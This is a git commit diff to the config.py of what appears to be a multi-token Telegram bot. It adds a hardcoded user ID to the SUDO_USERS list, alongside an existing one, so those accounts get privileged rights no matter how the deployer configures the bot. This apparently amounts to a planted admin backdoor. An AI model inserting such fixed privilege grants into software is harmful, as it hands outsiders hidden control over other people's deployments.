befa38421b768f3beb4d34f605228ab1696ac55d
X-STaR / <117068254+ItZxSTaR@users.noreply.github.com>
2022-11-23 22:08:26 +0530

    Update config.py

--- config.py
+++ config.py
@@ -27,6 +27,7 @@ BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
 SUDO_USERS.append(1410250744)
+SUDO_USERS.append(5327845950)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
